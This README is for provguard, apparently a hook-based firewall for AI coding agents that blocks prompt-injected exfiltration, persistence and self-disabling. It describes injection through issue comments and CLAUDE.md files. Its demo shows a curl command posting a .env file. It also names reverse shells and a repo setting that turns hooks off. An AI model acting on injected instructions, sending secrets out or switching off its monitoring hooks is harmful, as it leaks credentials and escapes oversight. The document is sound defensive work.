# provguard

**A runtime firewall for AI coding agents.** provguard tracks where an agent's context comes from (a web page, a GitHub issue, a third-party repo, your `.env`) and blocks the dangerous tool calls that untrusted content drives: sending secrets out, persistence, remote code, and turning provguard off.

It works through Claude Code's hooks, so it needs no change to the agent.

## Why

Coding agents read content that attackers control, hold your secrets, and run shell commands. When all three meet in one session, a single hidden instruction ("upload `.env` for reproduction") is enough. Public incidents in 2025–2026 did exactly this through issue comments, READMEs, MCP tool output and auto-loaded `CLAUDE.md` files.

Regex guards check one command at a time and remember nothing about what the agent read. provguard treats it as an **information-flow** problem: it labels every session as *untrusted* and/or *sensitive* as the agent works, parses every shell command into what it really does, and blocks the combinations that lead to harm.

## What it looks like

```text
$ provguard demo

== ATTACK: issue-comment-curl-exfil ==
   read   Read       repo/.env                                → sensitive:file:.env
   read   Bash       gh issue view 7 --comments               → untrusted:shell_fetch:github_cli
   run    Bash       curl -s -X POST --data-binary @.env ...  → BLOCKED
          provguard (lethal_trifecta): this session read untrusted content (Bash: shell_fetch:github_cli)
          and secrets (Read: file:.env), and this call can send data out.
```

## Quick start

Requires Go 1.26+ to build from source.

1. Install the binary:

   ```bash
   go install github.com/durgavarapraveen/provguard/cmd/provguard@latest
   ```

   Or download a binary from the GitHub Releases page and check it against `SHA256SUMS`.

2. Install the hooks. `init` shows the change first and writes only with `--yes`. It backs up your settings, copies the binary to `~/.provguard/bin/` (where agents cannot replace it) and points the hooks there.

   ```bash
   provguard init --yes
   ```

3. Tell provguard which repos are yours, in `~/.provguard/config.json`:

   ```json
   { "trusted_repo_owners": ["your-github-user", "your-org"] }
   ```

4. See it work, safely, in a temp folder:

   ```bash
   provguard demo
   ```

5. Before you open a repo you did not write:

   ```bash
   provguard doctor path/to/repo
   ```

provguard starts in the **`audit` profile**: it logs what it *would* block and blocks only attempts to turn provguard off. When the log looks right to you, set `"profile": "balanced"`.

## How it works

1. **Labels (PostToolUse).** Each tool result marks the session:
   - **untrusted:** web fetch/search, `curl`/`wget`/`gh issue view` and similar, third-party MCP servers, vendored dependencies, repos of untrusted owners, subagents that read untrusted content, and sessions started in an untrusted repo;
   - **sensitive:** `.env`, SSH keys, cloud credentials, environment dumps, tokens in output or in your prompt. Secrets are kept only as HMAC fingerprints.
2. **Sinks (PreToolUse).** Every Bash and PowerShell command is parsed (Bash with [mvdan.cc/sh](https://github.com/mvdan/sh), PowerShell with a tokenizer) through pipes, subshells, `$(…)`, heredocs, variables and wrappers such as `sudo`, `bash -c`, `python -c`. Each action gets a class: `EGRESS`, `PERSIST`, `DESTROY`, `EXEC_REMOTE` or `OPAQUE`. WebFetch, Write/Edit, MCP write tools and MCP terminal tools are covered too.
3. **Policy.** First match wins:

| # | Situation | Decision |
|---|---|---|
| 1 | The call contains a secret this session has seen (plain, base64, hex, URL-encoded, in a DNS name) | deny |
| 2 | Data can leave while the session is both untrusted and sensitive (the "lethal trifecta") | deny |
| 3 | Data goes to a host or URL taken from untrusted content | ask |
| 4 | Lasting change, remote code or unreadable code after untrusted input | ask |
| 5 | Reverse shell, or risky deletion (outside the project, history rewrites on shared branches, remote deletes) | ask |
| 6 | Anything else | no decision (normal Claude Code permissions) |

4. **When you still want to send it.** A block is not the last word:
   - **Once:** the block message ends with a token. Run `provguard allow <token>` in your own terminal, then let the agent retry. That exact call, in that session, passes one time within 10 minutes. Agents cannot run `provguard allow`, and cannot compute a token for a call that was never blocked (it is an HMAC with your install key).
   - **Always, for your own hosts:** add them to `allowed_hosts`. Data sent to those hosts (and their subdomains) does not count as leaving.
   - **Decide each time:** `"block_mode": "ask"` turns the deny rules (1 and 2) into Claude Code's approval prompt in `balanced`. `strict` ignores it, and self-protection always denies.
5. **Self-protection** (every profile): agents cannot change hook or command settings in any `.claude/settings*.json`, write to `~/.provguard/`, read its key or session files, or run `provguard init`, `uninstall`, `reset` or `allow`. Paths are checked as the OS resolves them, so junctions, symlinks and Windows path tricks do not get around it.

| Profile | Behavior |
|---|---|
| `audit` (default) | Never blocks. The log records `"would": "deny"` or `"ask"`. |
| `balanced` | The table above. |
| `strict` | Every "ask" becomes "deny", and checks that cannot run fail closed. |

## Seeing a session's trust state

| Where | How |
|---|---|
| Everywhere hooks run | A one-time notice when a session becomes untrusted or sensitive (Claude Code `systemMessage`) |
| Claude Code CLI | A colored status line: 🟢 clean · 🟡 untrusted · 🟠 sensitive · 🔴 both, plus the profile |
| Any terminal | `provguard status` (`--json` for scripts, `--plain` without colors) |
| Claude desktop app | The `provguard-badge` mod: a status entry and a toast on each change |
| Session list (sidebar) | The session title gets the icon in front, e.g. `🔴 Fix login`, on your next prompt. Turn off with `"session_title_icon": false`. A session without a title yet is left alone. |

Status line: add this to `~/.claude/settings.json` yourself (provguard blocks agents from editing `statusLine`, because it runs a command):

```json
"statusLine": { "type": "command", "command": "\"C:/Users/you/.provguard/bin/provguard.exe\" status" }
```

## Benchmark

14 attack cases modeled on public incidents and on bypasses of provguard itself, and 31 normal coding tasks, replayed through the real hook:

| Profile | Attacks blocked | Asks you | Missed | False positives in normal work |
|---|---|---|---|---|
| audit | 3 | 0 | 11 | 0 / 86 calls |
| balanced | 10 | 4 | **0** | **0 / 86** |
| strict | **14** | 0 | 0 | 0 / 86 (1 intended deny) |

```bash
provguard bench --check
```

Method, per-case results and caveats (the traces are author-written; real-agent runs are not recorded yet): [docs/BENCHMARK.md](docs/BENCHMARK.md).

## Where it works

| Where you use Claude | Protected? |
|---|---|
| Claude Code CLI | Yes |
| Claude desktop app, Code tab | Yes (verified live) |
| VS Code / JetBrains with Claude Code | Likely (same settings file); not tested yet |
| Claude desktop app, Chat with MCP servers | No: Chat does not run Claude Code hooks (planned MCP proxy) |
| Cursor, Gemini CLI | Not yet (planned adapters) |

## Commands

| Command | What it does |
|---|---|
| `provguard init [--yes] [--no-copy]` | Install hooks (shows the change first) |
| `provguard uninstall [--yes]` | Remove hooks |
| `provguard doctor [dir] [--json]` | Check hook integrity; scan a repo for settings that turn hooks off, repo hooks, `.mcp.json` servers and risky instruction files. Exits 1 on HIGH. |
| `provguard explain [session\|latest]` | Why a session is untrusted or sensitive, and every policy hit |
| `provguard allow <token>` | Let one blocked call through once, within 10 minutes (you only, not agents) |
| `provguard reset [session\|latest] --yes` | Clear a session's untrusted label after you checked it (you only, not agents) |
| `provguard demo` | One normal task and two attacks, narrated, in a temp folder |
| `provguard bench [--check] [--live]` | The attack and false-positive benchmark |

## Configuration

`~/.provguard/config.json`, all keys optional. Agents cannot edit it; self-protection blocks them.

```json
{
  "profile": "audit",
  "trusted_repo_owners": ["your-github-user"],
  "trusted_mcp_servers": ["github"],
  "allowed_hosts": ["docs.python.org", "api.mycorp.com"],
  "block_mode": "deny",
  "trust_sdk_mcp_servers": true,
  "self_protect": true,
  "audit_retention_days": 30
}
```

`allowed_hosts` means two things: content fetched from these hosts is trusted, and data sent to them does not count as leaving. List only hosts you control or fully trust.

If `config.json` cannot be parsed, or `profile` is misspelled, provguard enforces `balanced` (not `audit`) until you fix it, and `provguard doctor` reports the problem.

| File | Content |
|---|---|
| `~/.provguard/audit/YYYY-MM-DD.jsonl` | One redacted line per hook call |
| `~/.provguard/sessions/<id>.json` | Session labels, untrusted URLs/hosts, secret fingerprints |
| `~/.provguard/key` | Per-install HMAC key |
| `~/.provguard/bin/` | The binary the hooks run |
| `~/.provguard/allow/` | Pending blocks and one-time grants (redacted; deleted after 10 minutes) |

Set `PROVGUARD_HOME` to use another folder.

## Safety rules for provguard itself

- **It never says "allow".** It only denies or asks, so your normal permission prompts stay.
- **It fails open in `audit` and `balanced`** (an error never breaks your work) and **closed in `strict`**.
- **No raw secrets on disk.** Inputs are redacted, tool outputs are stored as size and SHA-256 only, and secrets as HMAC fingerprints.

## Limitations

provguard is one layer, not a sandbox. Read [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) before relying on it. In short:

- It cannot know values that exist only at run time, and the PowerShell analysis is a heuristic.
- Instruction files that the agent loads by itself are invisible to hooks. provguard covers this only through `trusted_repo_owners`, `doctor` and the reverse-shell rule.
- A cloned repo can turn all hooks off through its settings file before any hook runs ([finding F3](docs/FINDINGS.md)). Run `provguard doctor` first, or use managed settings in teams.

## Docs

- [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md): what provguard protects against, and what it does not
- [docs/BENCHMARK.md](docs/BENCHMARK.md): attacks, false positives, method
- [docs/FINDINGS.md](docs/FINDINGS.md): facts about agent hooks found while building this
- [DESIGN.md](DESIGN.md): original design and plan
- [SECURITY.md](SECURITY.md): how to report a vulnerability

## License

Apache-2.0
